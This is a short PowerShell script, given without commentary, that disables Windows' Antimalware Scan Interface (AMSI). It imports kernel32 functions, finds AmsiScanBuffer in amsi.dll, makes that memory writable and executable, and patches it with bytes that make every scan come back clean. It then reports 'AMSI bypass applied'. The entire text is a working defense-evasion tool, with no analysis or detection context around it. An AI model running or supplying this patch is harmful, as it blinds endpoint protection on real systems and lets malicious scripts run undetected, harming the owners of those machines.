$Kernel32 = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr LoadLibrary(string lpFileName);
[DllImport("kernel32.dll", SetLastError = true)]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -Namespace Win32 -Name Kernel32 -PassThru

$hAmsi = [Win32.Kernel32]::LoadLibrary("amsi.dll")
$AmsiScanBuffer = [Win32.Kernel32]::GetProcAddress($hAmsi, "AmsiScanBuffer")

if ($AmsiScanBuffer -eq 0) {
    Write-Host "AmsiScanBuffer not found"
    return
}

# Change memory protection to RWX (0x40)
$oldProtect = 0
[Win32.Kernel32]::VirtualProtect($AmsiScanBuffer, [UIntPtr]6, 0x40, [Ref]$oldProtect) | Out-Null

# Patch bytes: mov eax, 1 ; ret
$buf = [Byte[]](0xb8, 0x01, 0x00, 0x00, 0x00, 0xc3)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $AmsiScanBuffer, $buf.Length)

Write-Host "AMSI bypass applied"
